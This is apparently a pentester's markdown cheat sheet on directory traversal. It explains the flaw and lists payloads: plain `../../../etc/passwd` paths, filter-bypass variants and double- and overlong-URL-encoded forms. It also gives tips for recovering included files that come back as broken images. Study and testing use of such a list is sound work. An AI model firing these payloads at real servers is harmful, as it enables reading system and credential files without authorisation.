# Directory Traversal

+ Path or directory traversal is a typical file access vulnerability which leads to the ability to include files from the host servers file system, including those from the web application) which lie outside of the web hosts `root directory`
+ Path traversal occurs when the web server allows relative path changing to occur due to poor validation and sanitization of user-supplied or controlled file names or paths
+ In general vulnerable hosts allow directories to be traversed via the `../` unix notation resulting in an attacker being able to climb to higher directories in the file system tree to include sensitive files like `/etc/passwd` which live outside of the directory that the webserver is serving from initially

```
.
├── bin
├── boot
├── cdrom
├── dev
├── etc
├── home
├── lib 
├── lib32 
├── lib64 
├── libx32
├── lost+found
├── media
├── mnt
├── opt
├── proc
├── root
├── run
├── sbin 
├── snap
├── srv
├── swapfile
├── sys
├── tmp
├── usr
└── var
    ├── backups  
    └── www      -> web server serves from here ↥ ../
        ├── css
        ├── index.html
        └── js
```

## Approach

+ Path traversal involves an attacker leveraging the allowance of `../` or its variations to traverse/move to higher directories outside of the web servers root directory
	+ For example on linux based apache servers typically `var/www/html` is the root directory where web server files are hosted

### Payloads

+ Payloads may be appended from places like `domain.com/index.html/payload`
+ Or from URL parameters like `?filename=../../../etc/passwd`

#### General

`/../../../etc/passwd`

`..\`

`....//`

`....\/`

#### Encoded

+ Note the following all represent `../` or `..\` in differing levels of URL encoding

`%2e%2e%2f`

`%2e%2e/`

`..%2f`

`%2e%2e%5c`

`%2e%2e\`

`..%5c`

`%252e%252e%255c`

`..%255c`

`..%c0%af`

### Exfiltration

+ Sometimes a file included via path traversal will not be 'renderable' on the frontend and may instead return in a broken image or another format

#### Image Based

+ To exfiltrate the contents of an included image through firefox use the network dev tab to download the broken image and cat it or open it in a IDE to see the included content
+ Alternatively use a web proxy to view the raw response


## Resources

+ [OWASP Path traversal](https://owasp.org/www-community/attacks/Path_Traversal)